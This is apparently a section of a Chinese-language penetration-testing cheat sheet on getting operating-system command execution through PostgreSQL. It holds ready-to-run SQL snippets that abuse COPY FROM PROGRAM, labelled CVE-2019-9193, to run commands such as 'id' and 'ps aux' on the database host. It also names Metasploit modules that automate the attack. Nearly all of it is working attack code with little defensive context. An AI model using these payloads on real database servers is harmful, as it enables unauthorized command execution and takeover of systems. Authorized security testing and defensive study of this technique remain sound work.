## 命令执行

### PROGRAM

```sql
DROP TABLE IF EXISTS myoutput;
CREATE TABLE myoutput(filename text);
COPY myoutput FROM PROGRAM 'ps aux';
SELECT * FROM myoutput ORDER BY filename ASC;
```

### CVE-2019-9193

```sql
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

可以使用 Metasploit 框架直接利用：

> + multi/postgres/postgres_copy_from_program_cmd_exec
> + exploit/linux/postgres/postgres_payload
